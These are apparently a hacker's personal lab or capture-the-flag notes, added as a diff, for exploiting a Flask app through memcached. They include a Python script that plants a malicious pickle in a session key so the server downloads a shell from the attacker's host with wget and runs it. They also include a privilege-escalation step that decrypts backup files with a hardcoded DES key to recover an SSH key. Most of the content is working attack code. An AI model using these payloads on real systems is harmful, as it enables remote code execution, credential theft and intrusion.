@@ -1,0 +1,53 @@
+memcached exploit:
+
+realise that logging in to admin portal on port 5000 causes an additional session to be recorded on port 11211 slot id 4
+
+stats cachedump 4 0
+
+get the seesion id to be used later
+
+python3 exploit.py MYIP TARGETIP session:7fc2e9e2-d45a-4a99-9082-c373e15d49f9
+
+import pickle
+import os
+import sys
+from pymemcache.client import base
+
+class RCE:
+    def __reduce__(self):
+        cmd = ('wget http://{}:5000/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell'.format(sys.argv[1]))
+        return os.system, (cmd,)
+
+if __name__ == '__main__':
+    client = base.Client((sys.argv[2], 11211))
+    client.set(sys.argv[3], pickle.dumps(RCE()))
+
+go to /admin to trigger the exploit 
+
+tbh don't really know how this works but okay
+
+https://cyruslab.net/2021/04/08/deserialization-of-flask-app-and-memcached/
+
+
+
+
+privesc:
+
+/opt/backups folder
+
+analyze script, realise that the backup.py backups and encrypt files and stores them in data folder
+since you have the encrypt code, reverse engineer and do a decrypt code
+iterate through all encrypted objects in the data direct
+
+import sys
+from des import des, CBC, PAD_PKCS5
+
+k = des(b"87629ae8", CBC, b"\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
+with open('/opt/backups/data/{}'.format(sys.argv[1])) as f:
+    data = f.read()
+    print(k.decrypt(data))
+
+
+one of the encrypted files is ssh key
+
+
